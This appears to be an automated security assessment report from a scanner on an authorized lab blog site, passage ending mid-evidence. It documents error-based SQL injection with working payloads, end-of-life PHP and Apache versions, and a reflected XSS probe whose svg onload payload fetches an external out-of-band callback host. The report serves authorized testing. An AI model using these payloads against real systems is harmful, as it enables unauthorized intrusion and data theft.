# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — sqli SQL Injection via `category` query parameter (error-based)](#finding-1)
    - [2. HIGH — sqli SQL Injection via GET `category` parameter on /index.php](#finding-2)
    - [3. HIGH — vulnerable-component End-of-life PHP 7.4.33 — unpatched since 2022-11-28 (CVE-2023-3824 phar buffer overflow, CVE-2023-3823, CVE-2022-31631)](#finding-3)
    - [4. HIGH — burp✓ Input returned in response (reflected)](#finding-4)
    - [5. MEDIUM — vulnerable-component Outdated Apache httpd 2.4.54 — known CVEs fixed in 2.4.55/2.4.56 (CVE-2006-20001, CVE-2022-37436, CVE-2023-25690)](#finding-5)
    - [6. LOW — info-disclosure PHP error notices expose server filesystem path in every response](#finding-6)
    - [7. LOW — info-disclosure Apache directory listing enabled on /images](#finding-7)
    - [8. INFO — burp Path-relative style sheet import (2 URLs)](#finding-8)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqz0io2c-5gb80i` |
| Target | http://target.local:32868/ |
| Started | 2026-06-29T09:25:38.279Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 8 mapped · 8 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 8 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32868`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

8 finding(s): 4 high, 1 medium, 2 low, 1 info

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [sqli] SQL Injection via `category` query parameter (error-based)

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32868/

The `category` GET parameter is interpolated unsanitized into a MySQL query. Injecting a single quote (`'`) causes the database engine to return a raw error string directly in the HTML response, confirming error-based SQL injection. A boolean bypass (`1' OR '1'='1`) causes the query to return all posts regardless of category, confirming data extraction is possible. PHP `Notice` messages also expose the full server filesystem path (`/var/www/html/index.php`) on every page load, further narrowing attack surface for exploitation.

**Reproduction**

```
1. GET /?category=Nature (baseline — no error, 1515 bytes)
2. GET /?category=1' — response body contains: "Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' ORDER BY created_at DESC'"
3. GET /?category=Nature' — same MySQL error pattern confirming the injection point.
4. GET /?category=1'+OR+'1'%3D'1 — returns all blog posts, bypassing category filter (6352 bytes vs 1515 bytes baseline).
```

**Evidence**

- Evidence `ev-mqz0r3em-9` — `artifacts/s-0001/ev-mqz0r3em-9/`

Request:

```http
GET /?category=1 HTTP/1.1
Host: target.local:32868
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 1515
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 09:32:11 GMT
keep-alive: timeout=5, max=96
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Secret' >Secret</option>        </select>
    </form>

    <p>No posts found.</p></div>
</body>
</html>
```

- Evidence `ev-mqz0r2wi-8` — `artifacts/s-0001/ev-mqz0r2wi-8/`

Request:

```http
GET /?category=1%27 HTTP/1.1
Host: target.local:32868
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 1661
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 09:32:10 GMT
keep-alive: timeout=5, max=97
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Secret' >Secret</option>        </select>
    </form>

    Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' ORDER BY created_at DESC' at line 1
```

- Evidence `ev-mqz0sqll-d` — `artifacts/s-0001/ev-mqz0sqll-d/`

Request:

```http
GET /?category=Nature%27 HTTP/1.1
Host: target.local:32868
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 1666
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 09:33:27 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Secret' >Secret</option>        </select>
    </form>

    Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''Nature'' ORDER BY created_at DESC' at line 1
```

<a id="finding-2"></a>

### 2. [HIGH] [sqli] SQL Injection via GET `category` parameter on /index.php

- Screen: `s-0005`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32868/

The `category` GET parameter on `/index.php` is concatenated unsafely into a MySQL query. Injecting a single quote (`1'--`) causes the server to return a verbose MySQL syntax error exposing the query skeleton (`ORDER BY created_at DESC`). This is the same underlying vulnerability class as the already-confirmed finding on `/` but confirmed independently at the explicit `/index.php` endpoint.

**Reproduction**

```
1. GET /index.php?category=ValidCategory → 200, "No posts found" (1515 bytes, no error).\n2. GET /index.php?category=1'-- → 200, 1658 bytes, body contains "Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' ORDER BY created_at DESC' at line 1".
```

**Evidence**

- Evidence `ev-mqz0x2nh-11` — `artifacts/s-0005/ev-mqz0x2nh-11/`

Request:

```http
GET /index.php?category=ValidCategory HTTP/1.1
Host: target.local:32868
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 1515
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 09:36:50 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Secret' >Secret</option>        </select>
    </form>

    <p>No posts found.</p></div>
</body>
</html>
```

- Evidence `ev-mqz0x1z5-10` — `artifacts/s-0005/ev-mqz0x1z5-10/`

Request:

```http
GET /index.php?category=1%27-- HTTP/1.1
Host: target.local:32868
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 1658
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 09:36:49 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Secret' >Secret</option>        </select>
    </form>

    Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' ORDER BY created_at DESC' at line 1
```

- Evidence `ev-mqz0ypz1-17` — `artifacts/s-0005/ev-mqz0ypz1-17/`

Request:

```http
GET /index.php?category=1%27-- HTTP/1.1
Host: target.local:32868
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 1658
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 09:38:06 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Secret' >Secret</option>        </select>
    </form>

    Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' ORDER BY created_at DESC' at line 1
```

<a id="finding-3"></a>

### 3. [HIGH] [vulnerable-component] End-of-life PHP 7.4.33 — unpatched since 2022-11-28 (CVE-2023-3824 phar buffer overflow, CVE-2023-3823, CVE-2022-31631)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32868/

VERSION-BASED finding (matched by banner, not actively exploited). The server advertises `X-Powered-By: PHP/7.4.33` (observed on the 200 responses for / and /index.php; the fingerprint scan parsed this header). PHP 7.4.33 is the FINAL release of the 7.4 series, which reached END OF LIFE on 2022-11-28. As of this assessment it has received no security patches for ~3.5 years, so every PHP-core CVE disclosed after that date is unpatched on this host. Notable post-EOL issues that were fixed in supported branches (8.0.30/8.1.22/8.2.8 and the Dec-2022 releases) but never backported to 7.4: CVE-2023-3824 (stack buffer overflow in phar/php_var_unserialize directory handling — potential code execution, HIGH); CVE-2023-3823 (libxml external-entity / global-state issue — information disclosure); CVE-2022-31631 (PDO::quote integer overflow on SQLite — can defeat quoting → SQL injection); CVE-2023-0567/0568/0662 (bcrypt null-byte handling, 1-byte path-resolution overflow, request-body resource-exhaustion DoS). Note: CVE-2024-4577 (PHP-CGI argument injection) is NOT applicable here — it affects PHP-CGI on Windows code pages, and this is a Debian/Linux host. The operator should treat the EOL status itself as the core risk (no future fixes) and verify the specific CVEs against the actual SAPI/extensions in use before relying on any single one. Separately, display_errors is enabled (PHP Notices leak the absolute path /var/www/html/index.php), confirming a non-hardened production config.

**Reproduction**

```
1. GET http://target.local:32868/ and observe response header `X-Powered-By: PHP/7.4.33` (also present on /index.php). 2. Map 7.4.33 to the PHP release calendar: 7.4 EOL = 2022-11-28; 7.4.33 is the last 7.4 build. 3. Any PHP-core CVE published after 2022-11-28 (e.g. CVE-2023-3824, CVE-2023-3823, CVE-2022-31631) is unpatched. Negative control: a non-existent path returns a 404 (distinct status/length) used to anchor the live-host baseline; positives: two stable 200 banner pages.
```

**Evidence**

- Evidence `ev-mqz1n0g8-27` — `artifacts/_/ev-mqz1n0g8-27/`

Request:

```http
GET /verdict-nonexistent-path-404 HTTP/1.1
Host: target.local:32868
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 279
content-type: text/html; charset=iso-8859-1
date: Mon, 29 Jun 2026 09:57:00 GMT
keep-alive: timeout=5, max=98
server: Apache/2.4.54 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.54 (Debian) Server at target.local Port 32868</address>
</body></html>
```

- Evidence `ev-mqz1mz5h-25` — `artifacts/_/ev-mqz1mz5h-25/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32868
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 5630
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 09:56:58 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Secret' >Secret</option>        </select>
    </form>

    <div class='post'>
                    <h2>The Magic of Morning Dew</h2>
                    <p>Category: Nature</p>
                    <img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/>
                    <p>Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....</p>
                </div><div class='post'>
                    <h2>Sunset Serenades</h2>
                    <p>Category: Nature</p>
                    <img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/>
                    <p>As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....</p>
                </div><div class='post'>
                    <h2>Forest Whisperings</h2>
                    <p>Category: Nature</p>
                    <img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/>
                    <p>Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....</p>
                </div><div class='post'>
                    <h2>Decoding Tech Trends</h2>
                    <p>Category: Tech</p>
                    <img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/>
                    <p>An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....</p>
                </div><div class='post'>
                    <h2>The Future of Robotics</h2>
                    <p>Category: Tech</p>
                    <img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/>
                    <p>Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....</p>
                </div><div class='post'>
                    <h2>Mediterranean Diet Secrets</h2>
                    <p>Category: Cooking</p>
                    <img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/>
                    <p>Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....</p>
                </div><div class='post'>
                    <h2>The Art of French Baking</h2>
                    <p>Category: Cooking</p>
                    <img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/>
                    <p>Master the art of French baking with these simple steps for making the perfect croissant....</p>
                </div><div class='post'>
                    <h2>Beyond the Camera Lens</h2>
                    <p>Category: Photography</p>
                    <img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/>
                    <p>Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....</p>
                </div><div class='post'>
                    <h2>Urban Photography Tips</h2>
                    <p>Category: Photography</p>
                    <img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/>
                    <p>Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....</p>
                </div><div class='post'>
                    <h2>The Healing Power of Yoga</h2>
                    <p>Category: Health</p>
                    <img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/>
                    <p>Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....</p>
                </div></div>
</body>
</html>
```

- Evidence `ev-mqz1mzmx-26` — `artifacts/_/ev-mqz1mzmx-26/`

Request:

```http
GET /index.php HTTP/1.1
Host: target.local:32868
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 5630
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 09:56:59 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Secret' >Secret</option>        </select>
    </form>

    <div class='post'>
                    <h2>The Magic of Morning Dew</h2>
                    <p>Category: Nature</p>
                    <img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/>
                    <p>Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....</p>
                </div><div class='post'>
                    <h2>Sunset Serenades</h2>
                    <p>Category: Nature</p>
                    <img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/>
                    <p>As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....</p>
                </div><div class='post'>
                    <h2>Forest Whisperings</h2>
                    <p>Category: Nature</p>
                    <img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/>
                    <p>Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....</p>
                </div><div class='post'>
                    <h2>Decoding Tech Trends</h2>
                    <p>Category: Tech</p>
                    <img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/>
                    <p>An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....</p>
                </div><div class='post'>
                    <h2>The Future of Robotics</h2>
                    <p>Category: Tech</p>
                    <img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/>
                    <p>Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....</p>
                </div><div class='post'>
                    <h2>Mediterranean Diet Secrets</h2>
                    <p>Category: Cooking</p>
                    <img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/>
                    <p>Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....</p>
                </div><div class='post'>
                    <h2>The Art of French Baking</h2>
                    <p>Category: Cooking</p>
                    <img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/>
                    <p>Master the art of French baking with these simple steps for making the perfect croissant....</p>
                </div><div class='post'>
                    <h2>Beyond the Camera Lens</h2>
                    <p>Category: Photography</p>
                    <img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/>
                    <p>Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....</p>
                </div><div class='post'>
                    <h2>Urban Photography Tips</h2>
                    <p>Category: Photography</p>
                    <img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/>
                    <p>Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....</p>
                </div><div class='post'>
                    <h2>The Healing Power of Yoga</h2>
                    <p>Category: Health</p>
                    <img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/>
                    <p>Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....</p>
                </div></div>
</body>
</html>
```

<a id="finding-4"></a>

### 4. [HIGH] [burp✓] Input returned in response (reflected)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

✅ AI-verified by active re-test: Control (category=allcategories) returned no injected markup; both positive replays returned my injected `"><svg>` verbatim and unencoded inside the SQL error message — byte-identical (1665 bytes), confirming stable reflection of input into the response. (severity raised info→high: confirmed real, not info-only)

The value of the <b>category</b> request parameter is copied into the application's response. (confidence: CERTAIN) @ http://target.local:32868/

**Reproduction**

```
Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。
```

**Evidence**

- Evidence `ev-mqz1r358-29` — `artifacts/_/ev-mqz1r358-29/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32868

GET /?category='%22%3e%3csvg%2fonload%3dfetch%60%2f%2fi2lvglvhrq8vojpvxne5w4nkcbi56xzznrdf42uqj%5c.oastify.com%60%3e HTTP/1.1
Host: target.local:32868
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/1.1 200 OK
Date: Mon, 29 Jun 2026 10:00:03 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Content-Length: 1712
Content-Type: text/html; charset=UTF-8


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Nature' >Nature</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Tech' >Tech</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Cooking' >Cooking</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Photography' >Photography</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Health' >Health</option><br />
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
<option value='Secret' >Secret</option>        </select>
    </form>

    Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"><svg/onload=fetch`//i2lvglvhrq8vojpvxne5w4nkcbi56xzznrdf42uqj\.oastify.com`>' ' at line 1
```

- Evidence `ev-mqz1ruyk-2a` — `artifacts/_/ev-mqz1ruyk-2a/`

Request:

```http
GET /?category=allcategories HTTP/1.1
Host: target.local:32868
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-encoding: gzip
content-length: 510
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 10:00:46 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.54 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.4.33


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blog Home</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="container">
    <h1>Welcome to Our Blog</h1>


    <form action="" method="GET">
        <label for="category">Choose a category:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">All Categories</option>        
            <br />
